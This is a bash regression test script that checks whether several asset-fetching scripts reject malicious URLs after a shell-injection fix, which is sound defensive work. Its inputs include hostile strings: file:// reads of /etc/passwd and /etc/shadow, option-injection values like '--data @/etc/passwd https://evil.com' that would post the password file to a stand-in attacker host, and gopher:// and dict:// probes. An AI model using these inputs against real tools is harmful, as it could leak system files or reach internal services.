#!/bin/bash
# Regression tests for shell injection fix (Bug #1)
# Tests that fetch-stitch.sh and download-stitch-asset.sh reject malicious inputs.
#
# Usage:  bash security/tests/test-shell-injection.sh
# Exit 0 = all tests pass, non-zero = failure

set -u
PASS=0
FAIL=0
SCRIPT_DIR="$(cd "$(dirname "$0")/../.." && pwd)"

pass() { echo "  ✅ PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "  ❌ FAIL: $1"; FAIL=$((FAIL + 1)); }

run_should_fail() {
  local label="$1"; shift
  if "$@" > /dev/null 2>&1; then
    fail "$label (expected failure, got success)"
  else
    pass "$label"
  fi
}

run_should_pass() {
  local label="$1"; shift
  if "$@" > /dev/null 2>&1; then
    pass "$label"
  else
    fail "$label (expected success, got failure)"
  fi
}

echo ""
echo "=== Shell Injection Regression Tests ==="
echo ""

# --- Test fetch-stitch.sh (react-components) ---
FETCH_RC="$SCRIPT_DIR/plugins/stitch-build/skills/react-components/scripts/fetch-stitch.sh"

echo "--- fetch-stitch.sh (react-components) ---"

# Reject file:// protocol
run_should_fail "Rejects file:// URL" \
  bash "$FETCH_RC" "file:///etc/passwd" "/tmp/test-output.txt"

# Reject ftp:// protocol
run_should_fail "Rejects ftp:// URL" \
  bash "$FETCH_RC" "ftp://evil.com/file" "/tmp/test-output.txt"

# Reject gopher:// protocol
run_should_fail "Rejects gopher:// URL" \
  bash "$FETCH_RC" "gopher://evil.com:70/_xGET" "/tmp/test-output.txt"

# Reject dash-prefixed (option injection)
run_should_fail "Rejects dash-prefixed URL (option injection)" \
  bash "$FETCH_RC" "-o /tmp/pwned --url https://evil.com" "/tmp/test-output.txt"

# Reject empty URL
run_should_fail "Rejects empty URL" \
  bash "$FETCH_RC" "" "/tmp/test-output.txt"

# Reject data: URL
run_should_fail "Rejects data: URL" \
  bash "$FETCH_RC" "data:text/html,<h1>pwned</h1>" "/tmp/test-output.txt"

echo ""

# --- Test fetch-stitch.sh (react-native) ---
FETCH_RN="$SCRIPT_DIR/plugins/stitch-build/skills/react-native/scripts/fetch-stitch.sh"

echo "--- fetch-stitch.sh (react-native) ---"

run_should_fail "Rejects file:// URL" \
  bash "$FETCH_RN" "file:///etc/shadow" "/tmp/test-output.txt"

run_should_fail "Rejects option injection" \
  bash "$FETCH_RN" "--data @/etc/passwd https://evil.com" "/tmp/test-output.txt"

echo ""

# --- Test download-stitch-asset.sh ---
DOWNLOAD="$SCRIPT_DIR/plugins/stitch-build/skills/remotion/scripts/download-stitch-asset.sh"

echo "--- download-stitch-asset.sh ---"

run_should_fail "Rejects file:// URL" \
  bash "$DOWNLOAD" "file:///etc/passwd" "/tmp/test-output.txt"

run_should_fail "Rejects option injection" \
  bash "$DOWNLOAD" "-O /tmp/pwned" "/tmp/test-output.txt"

run_should_fail "Rejects dict:// URL" \
  bash "$DOWNLOAD" "dict://evil.com:11211/stat" "/tmp/test-output.txt"

echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="

if [ "$FAIL" -gt 0 ]; then
  exit 1
fi
exit 0
